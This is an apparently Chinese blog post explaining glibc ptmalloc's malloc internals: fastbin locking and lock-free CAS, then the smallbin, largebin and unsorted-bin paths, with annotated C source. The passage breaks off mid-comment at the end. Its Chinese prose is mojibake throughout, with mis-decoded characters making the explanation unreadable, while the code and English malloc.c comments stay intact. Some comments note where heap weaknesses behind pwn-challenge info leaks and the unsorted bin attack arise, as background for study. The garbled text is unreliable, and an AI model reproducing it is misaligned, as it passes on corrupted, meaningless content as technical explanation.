<p>å½“å¼€å¯äº† ATOMIC_FASTBINS æƒ…å†µå°±å˜å¾—å¤æ‚èµ·æ¥ï¼Œè¿™ä¸ªä¼˜åŒ–é€‰é¡¹æ˜¯æ–°ç‰ˆæœ¬ libc æ·»åŠ çš„ï¼Œè™½ç„¶ ptmalloc æ”¯æŒå¤šçº¿ç¨‹æ“ä½œï¼Œä½†æ˜¯å½“åœ¨åˆ†é…åŒºä¸­ç”³è¯·å¾ˆå¤šå°å†…å­˜æ—¶ï¼Œä¼šä½¿å¾—å†…å­˜ç¢ç‰‡åŒ–ï¼Œptmalloc ä¼šå°è¯•æ¸…ç†è¿™äº›ç¢ç‰‡ï¼Œåœ¨æ¸…ç†ç¢ç‰‡çš„æ—¶å€™å°±ä¸å¯é¿å…çš„è¦å¯¹åˆ†é…åŒºè¿›è¡ŒåŠ é”æ“ä½œï¼Œæ¯ä¸€æ¬¡åŠ é”è¦æ¶ˆè€—å¤§çº¦ 100ns çš„æ—¶é—´ï¼Œè¿™å°±å¯¼è‡´äº†å½“å¾ˆå¤šçº¿ç¨‹è¿›è¡ŒåŠ¨æ€å†…å­˜ç”³è¯·æ—¶ï¼Œptmalloc çš„æ•ˆç‡å¤§å¹…ä¸‹é™ã€‚</p>
<p>äºæ˜¯ ptmalloc åœ¨æ–°ç‰ˆæœ¬ä¸­å¯¹é”è¿›è¡Œäº†ä¼˜åŒ–ï¼Œæ·»åŠ  PER_THREAD å’Œ ATOMIC_FASTBINS ä¸¤ä¸ªä¼˜åŒ–é€‰é¡¹ï¼Œä½†æ˜¯é»˜è®¤æƒ…å†µä¸‹è¿™äº›é€‰é¡¹æ˜¯ä¸ä¼šå¼€å¯çš„ã€‚</p>
<p>ç»“åˆååº­çš„æ–‡ç« å¯ä»¥å¤§è‡´äº†è§£ä¸€ä¸‹ä¼˜åŒ–çš„ç­–ç•¥ï¼ŒATOMIC_FASTBINS ç”¨åˆ°äº†ä¸€ç§å«åš lock-free çš„æŠ€æœ¯å®ç°å•å‘é“¾è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„æ“ä½œ(å’Œæ•°æ®ç»“æ„å¾ˆç±»ä¼¼ï¼Œä½†æ˜¯è¦è€ƒè™‘å¤šçº¿ç¨‹çš„å½±å“)ï¼Œå¤šçº¿ç¨‹å®‰å…¨åœ¨ ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹è¿™æœ¬ä¹¦ä¸­æœ‰ç®€è¦çš„ä»‹ç»ï¼Œçº¿ç¨‹(åˆç§°ä¸º <strong>è½»é‡çº§è¿›ç¨‹</strong>)æ˜¯è¿›ç¨‹çš„ä¸€éƒ¨åˆ†ï¼Œä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥åŒ…å«å¤šä¸ªçº¿ç¨‹ï¼Œè¿™äº›çº¿ç¨‹å…±äº«è¿›ç¨‹çš„èµ„æºï¼Œè¿™å°±éšè—ç€ä¸€ä¸ªé—®é¢˜ï¼Œèµ„æºåªæœ‰ä¸€ä»½ï¼Œå¦‚æœä¸¤ä¸ªçº¿ç¨‹åŒæ—¶å»ä¿®æ”¹è¿™ä»½èµ„æºï¼Œå°±æœ‰å¯èƒ½ä¼šå¼•å‘æœªå®šä¹‰çš„è¡Œä¸ºã€‚ä¾‹å¦‚ä¸‹é¢çš„ä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">çº¿ç¨‹1               çº¿ç¨‹2</span><br><span class="line">i=1;                --i;</span><br><span class="line">++i;</span><br></pre></td></tr></table></figure></div>

<p>++i è¿™ç§ä»£ç çš„ä¸€ç§å®ç°æ–¹æ³•å¯èƒ½æ˜¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">å°† i è¯»å–åˆ°æŸä¸€ä¸ªå¯„å­˜å™¨ä¸­</span><br><span class="line">å¯„å­˜å™¨è‡ªå¢ 1</span><br><span class="line">å°†å¯„å­˜å™¨ä¸­çš„å€¼å­˜å› i</span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯ç°åœ¨æ¶‰åŠåˆ°ä¸€ä¸ªå¤šçº¿ç¨‹çš„é—®é¢˜ï¼Œå¦‚æœç¨‹åºçš„æ‰§è¡Œé¡ºåºæ˜¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">X1 è¡¨ç¤ºçº¿ç¨‹ 1 çš„å¯„å­˜å™¨    X2 è¡¨ç¤ºçº¿ç¨‹ 2 çš„å¯„å­˜å™¨</span><br><span class="line">åºå·      æŒ‡ä»¤          çº¿ç¨‹</span><br><span class="line">1        i = 1           1</span><br><span class="line">2        X1 = i          1</span><br><span class="line">3        X2 = i          2</span><br><span class="line">4        X1++            1</span><br><span class="line">5        X2--            2</span><br><span class="line">6        i = X1          1</span><br><span class="line">7        i = X2          2</span><br></pre></td></tr></table></figure></div>

<p>ä»é€»è¾‘ä¸Šçœ‹ï¼Œi çš„æœ€ç»ˆç»“æœåº”è¯¥æ˜¯ 1ï¼Œä½†æ˜¯ç°åœ¨å®ƒçš„ç»“æœæ˜¯ 0ã€‚å®é™…ä¸Š i çš„ç»“æœå¯èƒ½æ˜¯ 0ã€1 æˆ– 2ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå…¸å‹ç”±äºæ²¡æœ‰æ³¨æ„çº¿ç¨‹é—®é¢˜å¼•å‘çš„æœªå®šä¹‰è¡Œä¸ºã€‚</p>
<p>å›åˆ° malloc çš„ä»£ç ä¸­ï¼Œæ”¯æŒå¤šçº¿ç¨‹çš„åŸºç¡€å°±æ˜¯ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œäºæ˜¯åŠ é”æˆä¸ºäº†ä¸€ç§é‡è¦æ–¹å¼ï¼Œå½“æŸä¸ªçº¿ç¨‹å–å¾—èµ„æºçš„é”ä¹‹åï¼Œå…¶ä»–çº¿ç¨‹å¦‚æœæƒ³è¦è®¿é—®èµ„æºï¼Œå°±éœ€è¦ç­‰å¾…åŠ é”çº¿ç¨‹å®Œæˆå®ƒçš„å·¥ä½œå¹¶è§£é”ï¼Œä½†æ˜¯åŠ é”ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ï¼Œé¦–å½“å…¶å†²çš„å°±æ˜¯æ€§èƒ½é—®é¢˜ï¼Œè¿™ä¸€ç‚¹åœ¨ä¸Šæ–‡æåˆ°è¿‡ï¼Œå¦‚æœåŠ é”ä¸å½“çš„è¯è¿˜ä¼šå¼•èµ·æ­»é”(dead lock)ç­‰ç­‰ã€‚</p>
<p>äºæ˜¯äººä»¬å°±æå‡ºäº†å¦ä¸€ç§æ€è·¯ï¼Œå³æ— é”ç®—æ³•(lock-free)ï¼Œåˆå«åš CASï¼ŒCASçš„è¯­ä¹‰æ˜¯â€œæˆ‘è®¤ä¸ºVçš„å€¼åº”è¯¥ä¸ºAï¼Œå¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå°†Vçš„å€¼æ›´æ–°ä¸ºBï¼Œå¦åˆ™ä¸ä¿®æ”¹å¹¶å‘Šè¯‰æˆ‘Vçš„å€¼å®é™…ä¸ºå¤šå°‘â€ï¼ŒCASæ˜¯ä¹è§‚é”æŠ€æœ¯ï¼Œå½“å¤šä¸ªçº¿ç¨‹å°è¯•ä½¿ç”¨CASåŒæ—¶æ›´æ–°åŒä¸€ä¸ªå˜é‡æ—¶ï¼Œåªæœ‰å…¶ä¸­ä¸€ä¸ªçº¿ç¨‹èƒ½æ›´æ–°å˜é‡çš„å€¼ï¼Œè€Œå…¶å®ƒçº¿ç¨‹éƒ½å¤±è´¥ï¼Œå¤±è´¥çš„çº¿ç¨‹å¹¶ä¸ä¼šè¢«æŒ‚èµ·ï¼Œè€Œæ˜¯è¢«å‘ŠçŸ¥è¿™æ¬¡ç«äº‰ä¸­å¤±è´¥ï¼Œå¹¶å¯ä»¥å†æ¬¡å°è¯•ã€‚ CAS çš„æ•ˆç‡ç›¸è¾ƒäºé”æ¥è¯´æå‡äº†å¾ˆå¤šï¼Œå¹¶ä¸”æ›´åŠ å®‰å…¨äº†ï¼Œè¿™æ˜¯å› ä¸ºå…¶æ“ä½œæŒ‡ä»¤éƒ½æ˜¯åŸå­æŒ‡ä»¤(å¯ä»¥åœ¨ä¸€ä¸ª CPU å‘¨æœŸä¸­è¿è¡Œå®Œæ¯•ï¼Œä¸ä¼šå—å…¶ä»–çº¿ç¨‹å½±å“)ã€‚</p>
<p>CAS çš„ ABA é—®é¢˜ï¼šå¦‚æœæœ‰ä¸‰ä¸ªçº¿ç¨‹ Aã€Bã€Cï¼Œè‹¥ B çº¿ç¨‹å…ˆå–å¾—äº†é”ï¼Œä¿®æ”¹ç›®æ ‡å€¼ï¼Œä½†æ˜¯ C çº¿ç¨‹å…ˆäº A å–å¾—äº†é”ï¼Œå°†ç›®æ ‡å€¼ä¿®æ”¹å›æœ€åˆçš„å€¼ï¼Œè¿™æ—¶å¦‚æœ A å–å¾—é”ï¼Œå°±ä¸ä¼šå‘ç°åŸå§‹å€¼å·²ç»è¢«ä¿®æ”¹äº†ä¸€æ¬¡ï¼Œè¿™æ—¶å¯èƒ½ä¼šå¼•å‘ä¸€äº›æœªå®šä¹‰çš„è¡Œä¸ºï¼Œä½†æ˜¯åœ¨ malloc çš„ä»£ç ä¸­å¹¶ä¸ä¼šå‡ºç°è¿™ç§é—®é¢˜ã€‚</p>
<p>ç¬¬ä¸€æ¡è·¯å¤§è‡´å°±æ˜¯è¿™äº›å†…å®¹ï¼Œä¸éš¾å‘ç°ï¼Œfastbin æ˜¯æœ€ç®€å•ã€æœ€å¿«çš„ä¸€ç§ç¼“å†²åŒºï¼Œæœ‰å…³äºä» fastbin ä¸­åˆ†é…å †å—çš„æ€è·¯å¯ä»¥å‚è€ƒä¸‹é¢è¿™å¼ å›¾ç‰‡</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_4.png"
                      alt="malloc_free_4.png"
                ></p>
<p><strong>ç¬¬äºŒæ¡:</strong> å½“ nb å±äº smallbin èŒƒå›´æ—¶</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;  <span class="comment">// åˆ¤æ–­ nb æ˜¯å¦å¤„äº smallbin èŒƒå›´</span></span><br><span class="line">    idx = smallbin_index(nb);    <span class="comment">// é€šè¿‡ nb è®¡ç®—å‡ºå…¶æ‰€å±çš„ smallbin index</span></span><br><span class="line">    bin = bin_at(av,idx);  <span class="comment">// é€šè¿‡ä¸Šä¸€æ­¥è®¡ç®—å‡ºçš„ index åœ¨ arena ä¸­æ‰¾åˆ°å¯¹åº”é“¾è¡¨çš„è¡¨å¤´</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( (victim = last(bin)) != bin) &#123;  <span class="comment">// åˆ¤æ–­ smallbin æ˜¯å¦ä¸ºç©ºï¼Œå¹¶ä¸”æŠŠé“¾è¡¨ä¸­æœ€åä¸€ä¸ªå †å—ç»™ victim</span></span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* åˆå§‹åŒ–æ£€æŸ¥ */</span></span><br><span class="line">	malloc_consolidate(av);  <span class="comment">// åˆå¹¶ fastbin ä¸­çš„å †å—å¹¶æ”¾ç½®åœ¨ smallbin</span></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">	bck = victim-&gt;bk;  <span class="comment">// è·å–å½“å‰å †å—çš„å‰ä¸€ä¸ªå †å—</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (bck-&gt;fd != victim, <span class="number">0</span>))  <span class="comment">// æ£€æŸ¥ bck -&gt; fd æ˜¯å¦æŒ‡å‘ victim (é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥)</span></span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line">	set_inuse_bit_at_offset(victim, nb);  <span class="comment">// å°† victim ä¸‹ä¸€ä¸ªç›¸é‚»çš„å †å—çš„ P æ ‡å¿—ä½ç½® 1</span></span><br><span class="line">	bin-&gt;bk = bck;</span><br><span class="line">	bck-&gt;fd = bin;    <span class="comment">// å°†æœ€åä¸€ä¸ªå †å—ä» smallbin ä¸­å¸ä¸‹ï¼Œæ³¨æ„è¿™é‡Œæ²¡æœ‰æ¸…ç©º fdã€bk æŒ‡é’ˆï¼Œpwn é¢˜ä¸­çš„ä¿¡æ¯æ³„éœ²ä¸€èˆ¬æ˜¯åŸºäºæ­¤å¤„</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (av != &amp;main_arena)    <span class="comment">// æ£€æŸ¥å½“å‰åˆ†é…åŒºæ˜¯å¦ä¸ºä¸»åˆ†é…åŒº</span></span><br><span class="line">	  victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);   <span class="comment">// è¿”å›å †å—</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>å¼•ç”¨ malloc.c ç»™å‡ºçš„æ³¨é‡Šå¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">    hold one size each, no searching within bins is necessary.</span><br><span class="line">    (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">    processed to find best fit. But for small ones, fits are exact</span><br><span class="line">    anyway, so we can check now, which is faster.)</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆè¦åˆ¤æ–­ nb æ˜¯å¦åœ¨ smallbin èŒƒå›´å†…ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è®¡ç®—å…¶åœ¨ smallbin ä¸­çš„ index å¹¶æ ¹æ® index æ‰¾åˆ°é“¾è¡¨çš„è¡¨å¤´ï¼Œæ¥ç€æ˜¯ä¸€ä¸ªå…³é”®åˆ¤æ–­ï¼Œé€šè¿‡ if (victim &#x3D;&#x3D; 0) è¿›è¡Œåˆå§‹åŒ–æ£€æŸ¥ï¼Œè¿™æ˜¯ç”±äº (victim &#x3D; last(bin)) !&#x3D; bin æ‰§è¡Œå victim æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€æ˜¯ smallbin ä¸ä¸ºç©ºï¼Œå³æ‰¾åˆ°äº†ä¸€ä¸ªåˆé€‚çš„å †å—ï¼ŒäºŒæ˜¯ smallbin è¿˜æ²¡æœ‰åˆå§‹åŒ–æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œè¿™æ—¶å°±è¦è°ƒç”¨ malloc_consolidate æ¥åˆå¹¶ fastbin chunk åˆ° smallbin ä¸­(åé¢ä¼šæåˆ°)ã€‚</p>
<p>å¦‚æœæ‰¾åˆ°äº†ä¸€å—åˆé€‚çš„å†…å­˜ï¼Œå…ˆæ‰¾åˆ°å®ƒçš„ä¸Šä¸€ä¸ªå †å— bck(victim -&gt; bk)ï¼Œç„¶åè¿›è¡Œä¸€æ¬¡å®Œæ•´æ€§åˆ¤æ–­ï¼Œè¦æ±‚ bck çš„ fd æŒ‡é’ˆæŒ‡å‘ victimï¼Œå¦‚æœæ£€æŸ¥é€šè¿‡ï¼Œä¼šå°† victim ç‰©ç†ä¸Šç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—çš„ P æ ‡å¿—ä½(PREV_INUSE)ç½® 1ï¼Œæœ€åæŠŠ victim ä»é“¾è¡¨ä¸­å¸ä¸‹(é€šå¸¸ä½¿ç”¨ unlink å‡½æ•°ï¼Œä½†æ˜¯ä¸ºäº†æ•ˆç‡è¿™é‡Œæ²¡æœ‰ä½¿ç”¨)å¹¶è¿”å›ã€‚ é€šè¿‡åˆ†æä»£ç ä¹Ÿèƒ½å‘ç° smallbin çš„åˆ†é…æ–¹å¼çš„ç¡®æ˜¯å°¾éƒ¨å–å‡ºã€‚</p>
<p>è‹¥ smallbin ä¸ºç©ºä¼šç§»äº¤åˆ°ä¸‹ä¸€éƒ¨åˆ†ä»£ç å¤„ç†ã€‚</p>
<p>æœ‰å…³äºä» smallbin ä¸­åˆ†é…å †å—çš„æ€è·¯å¯ä»¥å‚è€ƒä¸‹é¢è¿™å¼ å›¾ç‰‡</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_5.png"
                      alt="malloc_free_5.png"
                ></p>
<p><strong>ç¬¬ä¸‰æ¡ï¼š</strong> nb å±äº largebin èŒƒå›´ or ä¹‹å‰çš„åˆ†é…è¯·æ±‚å¤±è´¥</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    idx = largebin_index(nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">      malloc_consolidate(av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆåˆ¤æ–­ nb åœ¨ large bin ä¸­çš„ indexï¼Œæ¥ç€åˆ¤æ–­ fastbin ä¸­æ˜¯å¦å­˜åœ¨ chunkï¼Œè‹¥å­˜åœ¨ï¼Œè°ƒç”¨ malloc_consolidate å°† fastbin chunk è¿›è¡Œåˆå¹¶ã€‚å¼•ç”¨ malloc.c ä¸­çš„æ³¨é‡Šå¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If this is a large request, consolidate fastbins before continuing.</span><br><span class="line">     While it might look excessive to kill all fastbins before</span><br><span class="line">     even seeing if there is space available, this avoids</span><br><span class="line">     fragmentation problems normally associated with fastbins.</span><br><span class="line">     Also, in practice, programs tend to have runs of either small or</span><br><span class="line">     large requests, but less often mixtures, so consolidation is not</span><br><span class="line">     invoked all that often in most programs. And the programs that</span><br><span class="line">     it is called frequently in otherwise tend to fragment.</span><br></pre></td></tr></table></figure></div>

<p>å¤§æ¦‚æ„æ€æ˜¯å¦‚æœ nb æ˜¯ä¸€ä¸ªåˆ†é…å¤§ç‰‡å†…å­˜çš„ç”³è¯·ï¼Œé¦–å…ˆä¼šåˆå¹¶ fastbin ä¸­çš„ chunkï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯é¿å…å†…å­˜ç¢ç‰‡åŒ–è¿‡äºä¸¥é‡ã€‚</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆä¸ç›´æ¥å» largebin ä¸­å–å †å—ï¼Œè€Œæ˜¯è¦å…ˆè¿›è¡Œå †å—åˆå¹¶ï¼Ÿå¦‚æœä»£ç è¿è¡Œåˆ°è¿™é‡Œï¼Œå°±è¯´æ˜ç”¨æˆ·ç”³è¯·çš„å†…å­˜ä¸€å®šæ˜¯ largebin æˆ–è€…æ›´å¤§ï¼Œå¦‚æœåœ¨è·å–äº† largebin index ä¹‹åç›´æ¥æœç´¢ largebinï¼Œå¾ˆå¯èƒ½åœ¨å¯¹åº”ä½ç½®ä¸Šå¹¶ä¸å­˜åœ¨åˆé€‚çš„å †å—ï¼Œè¿™æ ·ï¼Œå°±éœ€è¦å‘æ“ä½œç³»ç»Ÿç”³è¯·å¦ä¸€ç‰‡ç©ºé—´æ¥å®ç°å†…å­˜åˆ†é…ï¼Œå½“ç”¨æˆ·ç”³è¯·çš„å †å—ç¡®å®å¾ˆå¤§æ—¶è¿™æ ·åšå¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å½“ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¹¶ä¸æ˜¯é‚£ä¹ˆå¤§ï¼Œå°†å…¶ä»–é“¾è¡¨ä¸­(ä¸»è¦æ˜¯ fastbin)çš„å †å—åˆå¹¶ä¹‹åæ°å¥½èƒ½å¤Ÿæ»¡è¶³ç©ºé—´è¦æ±‚ï¼Œé‚£ä¹ˆå°±å¯ä»¥é¿å…å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œæå‡æ•ˆç‡çš„åŒæ—¶è¿˜é™ä½äº†å †çš„ç¢ç‰‡åŒ–ç¨‹åº¦ã€‚</p>
</blockquote>
<p><strong>æ³¨æ„ï¼</strong>åªæœ‰å½“ nb æ˜¯ä¸€ä¸ª largebin request æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œä¸Šé¢çš„ä»£ç ï¼Œå…¶ä»–æƒ…å†µ(ä¾‹å¦‚ä¸Šé¢ä¸¤æ¡è·¯ä¸­åˆ†é…å¤±è´¥çš„æƒ…å†µ)ä¼šä¸‹æ²‰åˆ°ä¸‹é¢çš„ä»£ç ä¸­å¤„ç†ï¼Œæ¥ä¸‹æ¥çš„ä»£ç å±äº malloc çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œä½¿ç”¨äº†å¾ˆå¤šå¾ªç¯åµŒå¥—ï¼Œå…¶å®è¿™äº›å¤æ‚çš„ç®—æ³•ä¸»è¦ç›®çš„å°±æ˜¯å¤„ç†ä¹‹å‰æ²¡æœ‰åˆ†é…æˆåŠŸçš„ smallbinã€fastbinã€largebin ç­‰è¯·æ±‚ã€‚</p>
<p>å¼•ç”¨ malloc.c çš„æ³¨é‡Šå¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Process recently freed or remaindered chunks, taking one only if</span><br><span class="line">    it is exact fit, or, if this a small request, the chunk is remainder from</span><br><span class="line">    the most recent non-exact fit.  Place other traversed chunks in</span><br><span class="line">    bins.  Note that this step is the only place in any routine where</span><br><span class="line">    chunks are placed in bins.</span><br><span class="line"></span><br><span class="line">    The outer loop here is needed because we might not realize until</span><br><span class="line">    near the end of malloc that we should have consolidated, so must</span><br><span class="line">    do so and retry. This happens at most once, and only when we would</span><br><span class="line">    otherwise need to expand memory to service a &quot;small&quot; request.</span><br></pre></td></tr></table></figure></div>

<p>æœ€åä¸€å¥è¯´æ˜äº†è¿›è¡Œå †å—åˆå¹¶çš„åŸå› ï¼Œé¿å…ç”±ä¸€ä¸ªè¾ƒå°çš„å†…å­˜è¯·æ±‚å»å‘æ“ä½œç³»ç»Ÿç”³è¯·æ–°çš„å†…å­˜ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;) &#123;    <span class="comment">// ä¸»å¾ªç¯å¼€å§‹</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( (victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;  <span class="comment">// åå‘å¾ªç¯éå† unsorted bin</span></span><br><span class="line">      bck = victim-&gt;bk; <span class="comment">// æ‰¾åˆ° unsorted bin é“¾è¡¨æœ€åä¸€ä¸ªå †å—çš„å‰ä¸€ä¸ªå †å—</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	  || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))  <span class="comment">// åˆ¤æ–­ size æ˜¯å¦åˆæ³•</span></span><br><span class="line">	malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">			 chunk2mem (victim));</span><br><span class="line">      size = chunksize(victim);  <span class="comment">// å¦‚æœåˆæ³•ï¼Œå°±æŠŠ victim -&gt; size èµ‹ç»™ size</span></span><br></pre></td></tr></table></figure></div>

<p>ä¸Šé¢è¿™æ®µä»£ç ä¸»è¦åœ¨éå†æœç´¢ unsorted binï¼Œå¼•ç”¨ malloc.c çš„æ³¨é‡Šå¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If a small request, try to use last remainder if it is the</span><br><span class="line">	 only chunk in unsorted bin.  This helps promote locality for</span><br><span class="line">	 runs of consecutive small requests. This is the only</span><br><span class="line">	 exception to best-fit, and applies only when there is</span><br><span class="line">	 no exact fit for a small chunk.</span><br></pre></td></tr></table></figure></div>

<p>å½“éå†åˆ°ä¸€ä¸ªå †å—åï¼Œä¼šç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">	  bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">	  victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">	  (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE)) &#123;  <span class="comment">// æ˜¯å¦åˆ‡å‰²çš„åˆ¤æ–­æ¡ä»¶</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* split and reattach remainder */</span></span><br><span class="line">	remainder_size = size - nb;    <span class="comment">// è®¡ç®—åˆ‡å‰²åå‰©ä½™çš„å †å—å¤§å°</span></span><br><span class="line">	remainder = chunk_at_offset(victim, nb);    <span class="comment">// åˆ‡å‰²å †å—</span></span><br><span class="line">	unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;  <span class="comment">// å°†å‰©ä½™çš„å †å—é‡æ–°é“¾æ¥åˆ° unsorted bin ä¸­</span></span><br><span class="line">	av-&gt;last_remainder = remainder;  <span class="comment">// é‡æ–°è®¾ç½®åˆ†é…åŒºçš„ last_remainder </span></span><br><span class="line">	remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);  <span class="comment">// æ›´æ–° remainder çš„ fdã€bk æŒ‡é’ˆ</span></span><br><span class="line">	<span class="keyword">if</span> (!in_smallbin_range(remainder_size))  <span class="comment">// å¦‚æœ remainder æ˜¯ largebin chunkï¼Œç”±äºä¸åœ¨ larbebin é“¾è¡¨ä¸­ï¼Œå…ˆæ¸…ç©ºfd_nextsizeå’Œbk_nextsize</span></span><br><span class="line">	  &#123;</span><br><span class="line">	    remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	set_head(victim, nb | PREV_INUSE |</span><br><span class="line">		 (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">	set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">	set_foot(remainder, remainder_size);   <span class="comment">// è®¾ç½®å †å—çš„ç»“æ„</span></span><br><span class="line"></span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);    <span class="comment">// è¿”å›å †å—</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></div>

<p>é‡ç‚¹åœ¨äºåˆ¤æ–­æ¡ä»¶ï¼Œnb åœ¨ smallbin èŒƒå›´å†…ï¼Œå¹¶ä¸” unsorted bin ä¸­åªæœ‰ä¸€ä¸ªå †å—ï¼Œå¹¶ä¸”è¿™ä¸ªå †å—æ˜¯å½“å‰åˆ†é…åŒºçš„ last_remainderï¼Œå¹¶ä¸” nb å°äºè¿™ä¸ªå †å—çš„ sizeï¼Œåªæœ‰æ»¡è¶³äº†ä»¥ä¸Šå››ä¸ªæ¡ä»¶ï¼Œæ‰èƒ½å¯¹ unsortedbin ä¸­çš„å †å—è¿›è¡Œåˆ‡å‰²ï¼Œå½¢æˆ remainderã€‚</p>
<p>å¦‚æœä¸Šè¿°æ¡ä»¶ä¸æ»¡è¶³ï¼Œå°±ä¸ä¼šå¯¹ unsortedbin chunk è¿›è¡Œåˆ‡å‰²ï¼Œè€Œæ˜¯è¿è¡Œä¸‹é¢çš„ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);    <span class="comment">// è¿™ä¸¤å¥ä»£ç å®ç°äº†å°† unsortedbin æœ€åä¸€ä¸ªå †å—å¸ä¸‹çš„æ“ä½œï¼Œæ³¨æ„æ²¡æœ‰ä½¿ç”¨æ ‡å‡†çš„ unlinkï¼Œè¿™æ˜¯ pwn é¢˜ä¸­æ¯”è¾ƒå¸¸è§çš„ unsortedbin attack å®ç°åŸºç¡€</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb) &#123;    <span class="comment">// åˆ¤æ–­è¿™ä¸ªå 